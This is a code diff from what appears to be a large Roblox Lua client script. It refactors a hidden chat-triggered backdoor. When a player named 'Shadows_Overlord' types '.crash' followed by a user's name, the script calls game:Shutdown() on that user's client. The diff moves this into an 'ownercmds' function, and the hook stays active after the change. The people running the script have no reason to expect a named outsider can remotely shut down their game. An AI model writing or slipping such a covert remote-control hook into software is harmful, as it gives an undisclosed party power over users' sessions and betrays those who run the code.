@@ -7729,28 +7729,25 @@ game.Players.ChildAdded:connect(function(Child)
 	end
 end)
 
+function ownercmds(p)
+	p.Chatted:connect(function(msg)
+		if msg:sub(1,7) == ".crash " then
+			v = FindTarget(msg:sub(8))
+			if v == lp.Name then
+				game:Shutdown()
+			end
+		end
+	end)
+end
+
 for i,v in pairs(game.Players:GetPlayers()) do
 	if v.Name == "Shadows_Overlord" then
-		v.Chatted:connect(function(msg)
-			if msg:sub(1,7) == ".crash " then
-				a = FindTarget(msg:sub(8))
-				if a == lp.Name then
-					game:Shutdown()
-				end
-			end
-		end)
+		ownercmds(v)
 	end
 end
 
-game.Players.ChildAdded:connect(function(Child)
-	if Child.Name == "Shadows_Overlord" then
-		Child.Chatted:connect(function(msg)
-			if msg:sub(1,7) == ".crash " then
-				a = FindTarget(msg:sub(8))
-				if a == lp.Name then
-					game:Shutdown()
-				end
-			end
-		end)
+game.Players.ChildAdded:connect(function(child)
+	if child.Name == "Shadows_Overlord" then
+		ownercmds(child)
 	end
 end
